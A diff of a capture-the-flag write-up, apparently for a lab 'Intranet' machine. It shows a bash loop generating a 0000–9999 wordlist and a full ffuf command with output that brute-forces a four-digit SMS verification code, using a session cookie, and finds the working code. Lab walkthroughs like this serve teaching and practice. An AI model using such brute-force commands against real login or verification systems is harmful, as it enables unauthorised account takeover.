@@ -404,23 +404,11 @@ eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
 
 <br>
 
-<h2 align="center">Crunch . Wordlist . 0000 to 9999</h2>
+<h2 align="center"Wordlist . 0000 to 9999</h2>
 
 ```bash
-(rosana) :~/Intranet# crunch 4 4 -t %%%% -o support
-Crunch will now generate the following amount of data: 50000 bytes
-0 MB
-0 GB
-0 TB
-0 PB
-Crunch will now generate the following number of lines: 10000 
-
-crunch: 100% completed generating output
+for i in {0000..9999}; do echo "$i"; done > support
 ```
-
-<p>
-
-- could have executed <code>for i in {0000..9999}; do echo "$i"; done > support</code></p>
 
 ```bash
 (rosana) :~/Intranet# tail -n 2 support
@@ -431,19 +419,54 @@ crunch: 100% completed generating output
 <h2 align="center">Ffuf</h2>
 
 ```bash
-(rosana) :~/Intranet# ffuf -u http://xx.xxx.x.xxx:8080/sms -c -w support -X POST -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=***************************.******.***************************' -fc 200
-...
-3553                    [Status: 302, Size: 197, Words: 18, Lines: 6]
-:: Progress: [10000/10000] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
+:~/Intranet# ffuf -u http://intranet.thm:8080/sms -c -w support -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ' -fc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://intranet.thm:8080/sms
+ :: Wordlist         : FUZZ: support
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
+ :: Data             : sms=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 200
+________________________________________________
+
+6285                    [Status: 302, Size: 197, Words: 18, Lines: 6]
+:: Progress: [10000/10000] :: Job [1/1] :: 625 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+
 ```
 
-<img width="1213" height="521" alt="image" src="https://github.com/user-attachments/assets/db36e6ff-c31e-4cbe-a8aa-77c71537a401" />
+<img width="1350" height="532" alt="image" src="https://github.com/user-attachments/assets/7573adfb-2e16-4a0c-8077-4f0f2f68ae68" />
 
 <br>
+<br>
+<br>
 
-<img width="1254" height="224" alt="image" src="https://github.com/user-attachments/assets/c7335e60-6c8f-4c1e-a2a1-0a0073625a22" />
+<img width="1059" height="292" alt="image" src="https://github.com/user-attachments/assets/fc872773-b683-485e-89f0-6e3f7a7a83a6" />
 
 <br>
+<br>
+<br>
+<p>
+
+- Logged in from 10.201.17.193, a different IP from 10.201.25.116</p>
+
+<img width="1060" height="410" alt="image" src="https://github.com/user-attachments/assets/7cd44025-c3c2-4ecc-981a-8124998b9f2f" />
+
 <p>
 
 - Web Application second flag<br>
